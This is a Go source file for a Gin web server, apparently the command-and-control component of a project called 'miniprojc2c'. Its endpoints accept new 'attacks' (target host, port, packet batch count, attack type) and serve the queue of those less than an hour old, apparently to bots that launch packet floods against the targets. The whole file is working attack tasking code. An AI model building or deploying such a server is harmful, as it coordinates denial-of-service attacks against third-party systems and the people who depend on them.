package app

import (
	"log"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/goddamnnoob/miniprojc2c/outbound"
)

var attacks []outbound.Attack

func Start() {
	r := gin.Default()
	r.SetTrustedProxies([]string{})
	r.GET("/ping", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"message": "pong",
		})
	})
	r.GET("/GetAllAttacks", GetAllAttacks)
	r.POST("/NewAttack", NewAttack)
	log.Println("Starting server")
	defer r.Run(":8000")
}

func GetAllAttacks(c *gin.Context) {
	checkExpiredattacks()
	c.Header("Content-Type", "application/json")
	c.JSON(200, attacks)
}

func NewAttack(c *gin.Context) {
	var attack outbound.Attack
	attack.Host = c.PostForm("host")
	if c.PostForm("port") != "" {
		port, err := strconv.Atoi(c.PostForm("port"))
		if err != nil {
			log.Fatal("Error while parsing body")
		} else {
			attack.Port = int16(port)
		}
	}
	if c.PostForm("packet_batch_count") != "" {
		pbc, err := strconv.Atoi(c.PostForm("packet_batch_count"))
		if err != nil {
			log.Fatal("Error while parsing body")
		} else {
			attack.Packetbatchcount = int64(pbc)
		}
	}
	attack.AttackType = c.PostForm("attack_type")
	attack.Createdtime = time.Now()
	attacks = append(attacks, attack)
	c.JSON(200, gin.H{
		"data": "successful",
	})
}

func checkExpiredattacks() {
	var newattacks []outbound.Attack
	for _, attack := range attacks {
		if time.Since(attack.Createdtime) < time.Hour*1 {
			newattacks = append(newattacks, attack)
		}
	}
	attacks = newattacks
}
